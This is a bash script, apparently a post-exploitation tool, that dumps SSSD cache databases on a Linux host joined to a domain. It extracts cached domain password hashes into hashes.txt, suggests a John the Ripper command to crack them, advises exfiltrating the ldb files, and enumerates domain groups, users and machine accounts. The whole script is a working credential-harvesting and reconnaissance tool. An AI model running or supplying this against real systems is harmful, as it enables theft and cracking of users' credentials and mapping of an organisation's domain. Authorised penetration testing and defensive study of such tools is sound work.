if [ -z $1 ]; then
    location_=/var/lib/sss/db
else
	location_="$1"
fi

analyze=0

if which "tdbdump" >/dev/null; then
	analyze=1
else
	echo "tdbdump is not installed so it is not possible to analyze ldb files"
	echo "Exfiltrate ldb files to a system with tdbdump or install it (apt install tdb-tools)"
	echo ""
fi

for db_ in $(ls $location_/*ldb)
do
	echo ""
	if [ "$analyze" -eq "1" ]; then
		number_of_accounts=$(tdbdump $db_ | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1 | sort -u | wc -l)
		echo "\e[1;36m[+] $number_of_accounts hash found in $db_  \e[0m"
		for account_ in $(tdbdump $db_ | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1 | sort -u)
		do
			echo "\n Account:	\e[1;32m$account_\e[0m"
			hash_=$(tdbdump $db_ | grep cachedPassword | grep $account_ | grep -o "\$6\$.*achedPassword" | awk -F 'Type' '{print $1}' | awk -F 'cachedPassword' '{print $1}' | awk -F 'lastCachedPassword' '{print $1}' | tr -d '\\0')
			echo " Hash:		\e[1;31m$hash_\e[0m"
			echo "$account_:$hash_" >> $location_/hashes.txt
		done
		if [ "$number_of_accounts" -gt "0" ]; then
			echo "\n[+] Adding identified hashes to hashes.txt \n"
			echo "[+] Use this command to crack the hashes: \e[1mjohn hashes.txt --format=sha512crypt \e[0m\n"
		fi
		
		
		##############################
		echo "\n"
		echo "\e[1;36m[+] Looking for domain groups in $db_  \e[0m\n"
		echo "\e[1;32m\n### Groups ###\e[0m\n==========================\n" | tee $location_/domain.txt
		groupArray=`tdbdump $db_ | grep "CN=GROUPS" | grep "DN=NAME" | awk -F '=' '{print $4}' | awk -F ',' '{print $1}'`
		number_of_groups=`echo "$groupArray" | wc -l`
		
		if [ "$number_of_groups" -gt "0" ]; then
			
			for group_ in "$groupArray"
			do
				echo "\e[1;33m$group_\e[0m"
				echo "$group_\n" >> $location_/domain.txt
			done
			echo "\n\e[1m[+] Groups added to domain.txt \e[0m\n"		
		else
		
			echo "\n\e[1;31m[-]\e[0m 0 groups found \e[0m\n" | tee -a $location_/domain.txt
		
		fi		
		
		
		##############################
		echo "\n"
		echo "\e[1;36m[+] Looking for domain user accounts in $db_  \e[0m\n"
		echo "\e[1;32m### User Accounts ###\e[0m\n==========================\n" | tee -a $location_/domain.txt
		userArray=$(tdbdump $db_ | grep "CN=USERS" | grep "DN=NAME" | awk -F '=' '{print $4}' | awk -F ',' '{print $1}' | grep -v '\$' | sort -u)

		number_of_users=`echo "$userArray" | wc -l`

		if [ "$number_of_users" -gt "0" ]; then
			
			for user_ in "$userArray"
			do
				echo "\e[1;33m$user_\e[0m"
				echo "$user_\n" >> $location_/domain.txt
			done
			echo "\n\e[1m[+] Users added to domain.txt \e[0m\n"
		else
		
			echo "\n\e[1;31m[-]\e[0m 0 users found \e[0m\n" | tee -a $location_/domain.txt
		
		fi
		
		
		##############################
		echo "\n"
		echo "\e[1;36m[+] Looking for domain machine accounts in $db_  \e[0m\n"
		echo "\e[1;32m### Machine Accounts ###\e[0m\n==========================\n" | tee -a $location_/domain.txt

		
		machineArray=$(tdbdump $db_ | grep "CN=USERS" | grep "DN=NAME" | awk -F '=' '{print $4}' | awk -F ',' '{print $1}' | grep '\$')
		number_of_machine=$(tdbdump $db_ | grep "CN=USERS" | grep "DN=NAME" | awk -F '=' '{print $4}' | awk -F ',' '{print $1}' | grep '\$' | wc -l)

		if [ $number_of_machine -gt 0 ]; then
			for machine_ in "$machineArray"
			do
				echo "\e[1;33m$machine_\e[0m"
				echo "$machine_\n" >> $location_/domain.txt
			done
			echo "\n\e[1m[+] Machines added to domain.txt \e[0m\n"		
		else
		
			echo "\e[1;31m[-]\e[0m 0 machines found \e[0m\n" | tee -a  $location_/domain.txt
		
		fi
		
	fi
done
echo ""
